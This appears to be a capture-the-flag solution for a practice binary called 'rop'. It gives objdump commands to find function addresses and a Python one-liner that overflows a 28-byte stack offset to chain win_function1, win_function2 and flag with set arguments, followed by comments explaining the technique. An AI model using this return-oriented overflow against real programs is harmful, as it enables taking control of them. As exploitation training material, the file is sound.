# This is manual solution
# Run:
	objdump -t ../rop | grep "win_function1" | cut -d' ' -f1
	objdump -t ../rop | grep "win_function2" | cut -d' ' -f1
	objdump -t ../rop | grep "flag" | cut -d' ' -f1
# Use the addresses with 0x prefix in the next command
	python -c "import struct; \
		print('A'*28 + \
		struct.pack('I', 0xADDRESS_1_HERE) + \
		struct.pack('I', 0xADDRESS_2_HERE) + \
		struct.pack('I', 0xADDRESS_3_HERE) + \
		struct.pack('I', 0xbaaaaaad) + \
		struct.pack('I', 0xdeadbaad))" | ../rop
# If you have 64-bit system and you can't run 32-bit files add "qemu-i386" before "../rop"

# Explanation:
#	The buffer in at offset 24
#	Then the previous stack pointer and the return address

# If we will send 28 bytes and then address
# 	the "return address" will point that address
# 	causing code redirection.

# So the program will return into:
# 	win_function1
# Then:
# 	win_function2 with the argument 0xbaaaaaad
# Then:
# 	flag with the argument 0xdeadbaad

# Every return address is in the format:
#	0xreturn_address
#	0xnext_return_address
#	0xargumet/s